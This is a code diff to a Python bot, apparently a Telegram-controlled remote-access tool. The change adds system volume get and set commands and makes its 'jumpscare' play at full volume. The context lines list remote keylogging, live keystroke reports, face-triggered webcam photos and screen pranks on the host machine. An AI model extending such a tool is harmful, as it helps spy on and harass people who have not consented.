@@ -17,8 +17,13 @@ from cv2 import (VideoWriter, VideoCapture, imwrite, imshow, imread, resize, wai
 from moviepy.editor import AudioFileClip, VideoFileClip
 
 #AUDIO
+from math import log10
 import soundfile as sf
 import sounddevice as sd
+from comtypes import CLSCTX_ALL
+from ctypes import cast, POINTER
+from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+
 try:
     from winsound import PlaySound, SND_FILENAME
 except ImportError:
@@ -134,6 +139,8 @@ quickmenu - Opens a quick menu.
 waitforface - Send a webcam photo when face is detected till timeout.
 keylogger - Records pressed keys on keyboard.
 livekeylogger - Sends live updates about what's being typed on the keyboard.
+setvolume - Set computer's volume level.
+getvolume - Gets the computer's volume level.
 
 *sending a photo* - Displays the photo on the screen as a pop-up.
 *sending an audio/voice* - Will play the audio/voice in the background.
@@ -226,18 +233,6 @@ def detect_face(cap:VideoCapture|None=None) -> tuple[int,Mat]:
     net.setInput(blob)
     detections = net.forward()
     return sum(1 for i in range(detections.shape[2]) if detections[0, 0, i, 2] > 0.5), frame
-
-def set_volume(volume_percent: int) -> None:
-    volume_percent = max(0, min(100, volume_percent))
-    system = platform_system()
-
-    if system == "Windows":
-        volume = int((volume_percent / 100) * 0xFFFF)
-        ctypes.windll.winmm.waveOutSetVolume(0, volume | (volume << 16))
-    elif system == "Linux":
-        sp.run(["amixer", "-D", "pulse", "sset", "Master", f"{volume_percent}%"], check=False)
-    elif system == "Darwin":  # macOS
-        sp.run(["osascript", "-e", f"set volume output volume {volume_percent}"], check=False)
 
 def load_images(vfx_folder: str=vfx) -> dict[str:Mat]:
     return { x[:-4]:compress_and_resize_image(imread(join(vfx_folder,x))) for x in listdir(vfx_folder) }
@@ -477,6 +472,35 @@ class LoadingBar:
         self.progress = self.tot
         self.update()
 
+
+
+"""
+ooo        ooooo             ooo        ooooo  o8o
+`88.       .888'             `88.       .888'  `"'
+ 888b     d'888  oooo    ooo  888b     d'888  oooo  oooo    ooo  .ooooo.  oooo d8b 
+ 8 Y88. .P  888   `88.  .8'   8 Y88. .P  888  `888   `88b..8P'  d88' `88b `888""8P 
+ 8  `888'   888    `88..8'    8  `888'   888   888     Y888'    888ooo888  888     
+ 8    Y     888     `888'     8    Y     888   888   .o8"'88b   888    .o  888     
+o8o        o888o     .8'     o8o        o888o o888o o88'   888o `Y8bod8P' d888b    
+                 .o..P'
+                 `Y8P'
+"""
+class CustomMixer:
+    def __init__(self) -> None:
+        devices = AudioUtilities.GetSpeakers()
+        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+        self.volume = cast(interface, POINTER(IAudioEndpointVolume))
+    
+    def setVolumePercentage(self, percentage: int|float) -> None:
+        percentage = float(percentage)
+        if percentage in range(0, 101):
+            self.volume.SetMasterVolumeLevelScalar(percentage/100, None) 
+    
+    def getVolumePercentage(self) -> int:
+        current_volume = round(self.volume.GetMasterVolumeLevelScalar()*100)
+        return current_volume
+
+
 """
 ooooooooo.     .oooooo.   ooooooooo.
 `888   `Y88.  d8P'  `Y8b  `888   `Y88.
@@ -489,15 +513,16 @@ o888o  o888o  `Y8bood8P'  o888o        `Y8bod8P'  888bod8P'
                                                  o888o
 """
 class PeppinoTelegram:
-    def __init__(self, token: str, owner_id: int) -> None:
+    def __init__(self, token: str, owner_id: int, mixer: CustomMixer) -> None:
         self.token = token
         self.help = HELP
+        self.page = 0
         self.owner_name = ""
         self.bot = Bot(token) 
         self.owner_id = owner_id
         self.duckyhelp = DUCKYHELP
         self.explorer_path = getcwd()
-        self.page = 0
+        self.audio_mixer = mixer
         self.explorer_message = None
         #converts text to functions
         self.function_table: dict[str:Callable] = {
@@ -531,7 +556,9 @@ class PeppinoTelegram:
             "distortedscreen":self.distorted_screen,
             "fullclip":self.record_webcam_and_screen,
             "duckyhelp":lambda: self.bsend(self.duckyhelp),
+            "setvolume":self.audio_mixer.setVolumePercentage,
             "id":lambda:self.bsend(f"CHAT_ID: {self.owner_id}"),
+            "getvolume":lambda:self.bsend(f"Current Volume: {self.audio_mixer.getVolumePercentage()}"),
         }
         self.no_background_functions = [self.message_box, self.spam_windows]
     
@@ -548,6 +575,12 @@ class PeppinoTelegram:
     
     def __play_loaded_sound(self, audio: str) -> None:
         self.__playsound(self.audios[audio])
+
+    def set_volume(self, volume):
+        if volume in range(0, 101):
+            self.audio_mixer.setVolumePercentage(volume)
+        else:
+            self.bsend(f"Volume must be from 0.0 to 100.0")
     
     def new_editable_message(self, content: str, autosend: bool=True) -> EditableMessage:
         return EditableMessage(self.bot, self.owner_id, content, autosend)
@@ -920,7 +953,8 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'   o
         show_image_fullscreen(modded_img, timeout)
 
     def jumpscare(self, image=None, audio=None, playaudio=True, showimage=True) -> None:
-        set_volume(100)
+        old_volume = self.audio_mixer.getVolumePercentage()
+        self.audio_mixer.setVolumePercentage(100)
         if image is None:
             image = self.images[choice(list(self.images.keys()))]
         else:
@@ -939,6 +973,7 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'   o
             audioThread.join()
         if showimage:
             imageThread.join()
+        self.audio_mixer.setVolumePercentage(old_volume)
     
     def plankton(self) -> None:
         self.jumpscare("plankton", "plankton")
@@ -1007,7 +1042,7 @@ o888o        o88o     o8888o o888o  o888o 8""88888P'  o888o o8o        `8   `Y8b
                     func(*function_args)
                 else:
                     if function_args:
-                        thread_args = (function_args,)
+                        thread_args = (*function_args,)
                         new_thread = Thread(target=func, args=thread_args)
                     else:
                         new_thread = Thread(target=func)
@@ -1079,5 +1114,6 @@ o888o        o88o     o8888o o888o  o888o 8""88888P'  o888o o8o        `8   `Y8b
 
 if __name__ == "__main__":
     token, chat_id = getCred() 
-    pep2 = PeppinoTelegram(token,chat_id)
+    mixer = CustomMixer()
+    pep2 = PeppinoTelegram(token,chat_id,mixer)
     pep2.start()
